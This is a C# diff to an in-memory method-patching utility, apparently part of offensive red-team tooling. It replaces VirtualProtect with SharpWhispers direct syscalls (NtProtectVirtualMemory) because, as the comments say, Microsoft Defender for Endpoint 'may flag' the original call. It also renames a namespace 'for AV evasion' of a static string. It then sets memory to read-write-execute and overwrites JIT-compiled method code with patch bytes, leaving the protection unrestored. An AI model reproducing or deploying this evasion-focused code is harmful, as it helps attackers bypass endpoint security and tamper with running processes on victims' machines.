@@ -7,6 +7,10 @@ using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
 
+//SysWhispers
+using Data = SharpWhisp3rz.Data; //simple string substitution for AV evasion of static string "SharpWhispers"
+using Syscall = Syscalls.Syscalls;
+
 namespace Editor {
     public static class Methods {
 
@@ -38,14 +42,17 @@ namespace Editor {
             return 1;
         }
 
-        public static void Patch(MethodInfo original, MethodInfo replacement) {
+        public static void Patch(MethodInfo original, MethodInfo replacement)
+        {
             //JIT compile methods
             RuntimeHelpers.PrepareMethod(original.MethodHandle);
             RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
 
             //Get pointers to the functions
             IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
+            Console.WriteLine("[!] OG Site  : {0}", originalSite.ToString("X8"));
             IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
+            Console.WriteLine("[!] Replace  : {0}", replacementSite.ToString("X8"));
 
             //Generate architecture specific shellcode (ORIGINAL)
             /*byte[] patch = null;
@@ -87,27 +94,50 @@ namespace Editor {
 
             //Temporarily change permissions to RWE
             uint oldprotect;
-            if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, 0x40, out oldprotect)) { //MDE may flag on this
+
+            //old code, which MDE may flag on
+            /*if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, 0x40, out oldprotect))
+            { 
+                throw new Win32Exception();
+            }*/
+            int nPID = System.Diagnostics.Process.GetCurrentProcess().Id;
+            Console.WriteLine("[!] Proc ID: {0}", nPID.ToString());
+
+            IntPtr HProc = GetCurrentProcess();
+            Console.WriteLine("[!] HProc  : {0}", HProc.ToString());
+
+            IntPtr AllocationSize = (IntPtr)(ptch.Length); //IntPtr holding size of bytes
+
+            oldprotect = Syscall.NtProtectVirtualMemory(HProc, ref originalSite, ref AllocationSize, 0x40);
+            Console.WriteLine("[!] OldProtect  : {0}", oldprotect.ToString());
+            if (oldprotect < 1)
+            {
+                Console.WriteLine("[!] Failure to change permissions!");
                 throw new Win32Exception();
             }
 
             //Apply the patch
             IntPtr written = IntPtr.Zero;
-            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, ptch, (uint)ptch.Length, out written)) {
+            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, ptch, (uint)ptch.Length, out written))
+            {
+                Console.WriteLine("[!] Failure to write to memory!");
                 throw new Win32Exception();
             }
 
             //Flush insutruction cache to make sure our new code executes
-            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)ptch.Length)) {
+            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)ptch.Length))
+            {
+                Console.WriteLine("[!] Failure to flush instruction cache!");
                 throw new Win32Exception();
             }
 
             //Restore the original memory protection settings
-            if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, oldprotect, out oldprotect)) {
+            /*if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, oldprotect, out oldprotect)) {
                 throw new Win32Exception();
-            }
-        }
+            }*/
+            //Syscall.NtProtectVirtualMemory(GetCurrentProcess(), ref originalSite, ref AllocationSize, oldprotect);
 
+        }
         private static string Transform(string input) {
             StringBuilder builder = new StringBuilder(input.Length + 1);    
             foreach(char c in input) {
